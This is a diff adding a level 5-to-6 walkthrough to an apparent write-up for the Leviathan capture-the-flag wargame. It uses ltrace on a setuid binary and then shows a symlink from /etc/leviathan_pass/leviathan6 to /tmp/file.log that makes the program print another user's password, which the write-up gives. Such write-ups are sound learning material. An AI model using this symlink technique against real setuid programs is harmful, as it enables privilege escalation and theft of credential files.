@@ -276,3 +276,63 @@ It gives us a binary string, 8 bits per set.
 I'll use a free *bin-to-ascii* online converter.
 
 It truns out that `Tith4cokei` is the password.
+
+### Level 5 => 6
+
+Gimmie gimmie...
+
+```console
+$ ls -Al
+total 20
+-rw-r--r-- 1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r-- 1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
+-rw-r--r-- 1 root       root        675 May 15  2017 .profile
+$ ./leviathan5 
+Cannot find /tmp/file.log
+```
+
+Inspect it with ltrace
+
+```console
+$ echo abc > /tmp/file.log
+leviathan5@leviathan:~$ ltrace ./leviathan5 
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                              = 0x804b008
+fgetc(0x804b008)                                         = 'a'
+feof(0x804b008)                                          = 0
+putchar(97, 0x8048720, 0xf7e40890, 0x80486eb)            = 97
+fgetc(0x804b008)                                         = 'b'
+feof(0x804b008)                                          = 0
+putchar(98, 0x8048720, 0xf7e40890, 0x80486eb)            = 98
+fgetc(0x804b008)                                         = 'c'
+feof(0x804b008)                                          = 0
+putchar(99, 0x8048720, 0xf7e40890, 0x80486eb)            = 99
+fgetc(0x804b008)                                         = '\n'
+feof(0x804b008)                                          = 0
+putchar(10, 0x8048720, 0xf7e40890, 0x80486ebabc
+)            = 10
+fgetc(0x804b008)                                         = '\377'
+feof(0x804b008)                                          = 1
+fclose(0x804b008)                                        = 0
+getuid()                                                 = 12005
+setuid(12005)                                            = 0
+unlink("/tmp/file.log")                                  = 0
++++ exited (status 0) +++
+```
+
+It looks for a file to read, and then outputs it's content.
+Remember that it swaps it's uid to *leviathan6*'s (look at **getuid()**)
+
+A while ago creating a symbolic link linking to user's password was the solution.
+Likewise, do that in this situation.
+
+```console
+$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+$ ./leviathan5 
+UgaoFee4li
+```
+
+And there we have it!
+The password is `UgaoFee4li`
+
